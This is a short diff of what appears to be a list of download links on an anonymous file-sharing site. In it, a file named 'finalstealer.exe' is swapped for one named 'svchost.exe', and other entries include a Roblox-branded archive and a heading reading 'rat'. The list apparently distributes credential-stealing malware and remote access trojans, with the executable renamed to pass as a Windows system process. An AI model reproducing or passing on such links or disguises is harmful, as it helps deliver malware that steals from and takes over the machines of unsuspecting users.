@@ -10,7 +10,7 @@
 
 https://anonsharing.com/file/b61b3e2f93a11754/extension-roblox.rar
 
-https://anonsharing.com/file/33fe159a50c415f3/finalstealer.exe
+https://anonsharing.com/file/2946015730a15008/svchost.exe
 
 # rat
 
